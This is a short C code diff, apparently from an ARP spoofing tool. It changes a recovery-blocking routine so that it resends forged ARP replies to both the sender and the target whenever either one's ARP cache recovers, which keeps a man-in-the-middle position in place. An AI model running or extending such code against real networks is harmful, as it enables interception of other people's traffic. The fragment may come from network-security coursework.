@@ -182,6 +182,8 @@ void *BLOCK_RECOVERY(void *info)
 		{
 			if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
 			else { puts("[  RINF  ] sender <- attacker    target"); }
+			if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
+			else { puts("[  RINF  ] sender    attacker -> target"); }
 			continue;
 		}
 
@@ -189,6 +191,8 @@ void *BLOCK_RECOVERY(void *info)
 		{
 			if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
 			else { puts("[  RINF  ] sender    attacker -> target"); }
+			if (pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- RINF -] pcap_sendpacket error"); }
+			else { puts("[  RINF  ] sender <- attacker    target"); }
 			continue;
 		}
 	}
